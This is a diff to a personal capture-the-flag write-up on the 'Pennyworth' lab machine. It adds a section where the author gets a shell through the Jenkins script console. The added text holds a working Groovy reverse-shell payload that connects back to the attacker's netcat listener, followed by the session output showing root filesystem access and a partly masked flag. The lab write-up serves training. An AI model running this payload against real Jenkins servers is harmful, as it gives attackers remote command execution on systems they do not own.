@@ -1,4 +1,7 @@
-%% Table later %%
+- [nmap](#nmap)
+- [Web Access](#web-access)
+- [Getting Shell](#getting-shell)
+
 
 # Pennyworth Enumeration
 
@@ -62,7 +65,11 @@ Now, Jenkins is a CI/CD tool, so it's likely that there is a way to upload a scr
 
 ## Getting Shell
 
-Following the website guide, 
+Following the website guide, I have to paste the shell command to the script console while listening to a designated port. For this case, I used port 4444 as a listener..
+
+```bash
+$nc -lvnp 4444
+```
 
 ```groovy
 String host="{my localhost port}";
@@ -73,3 +80,43 @@ Process p=new
 ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
+And this gave me shell acces!! 
+
+```bash
+$ nc -lvnp 4444           
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.231.216] 51662
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+
+cd root
+ls
+flag.txt
+snap
+
+cat flag.txt
+9cd**
+```
